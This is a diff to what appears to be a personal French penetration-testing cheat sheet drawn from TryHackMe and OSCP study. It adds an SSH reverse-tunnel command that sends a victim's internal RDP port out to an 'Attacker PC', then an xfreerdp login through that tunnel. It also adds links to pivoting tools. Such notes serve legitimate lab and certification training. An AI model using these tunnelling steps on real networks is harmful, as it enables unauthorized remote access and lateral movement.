@@ -534,6 +534,11 @@
     Emplacement des objets AD supprimés 
           CN=Deleted Objects,DC=za,DC=tryhackme,DC=com
 
+    Tunneling SSH pour obtenir un rdp
+          C:\> ssh tunneluser@1.1.1.1 -R 3389:3.3.3.3:3389 -N
+          This will establish an SSH session from PC-1 to 1.1.1.1 (Attacker PC) using the tunneluser user.
+          Puis sur la kali : munra@attacker-pc$ xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
+
 #[BUFFER OVERFLOW]
 
     https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/buffer-overflows.rst
@@ -609,6 +614,14 @@
       https://github.com/noraj/OSCP-Exam-Report-Template-Markdown
       https://github.com/cyber-cfreg/Penetration-Test-Report-Template
 
+#[PORT FORWARDING ET SSH TUNNEL]
 
+    https://github.com/sshuttle/sshuttle
+
+    https://github.com/klsecservices/rpivot
+
+    https://github.com/jpillora/chisel
+
+    https://adepts.of0x.cc/shadowmove-hijack-socket/
 
 
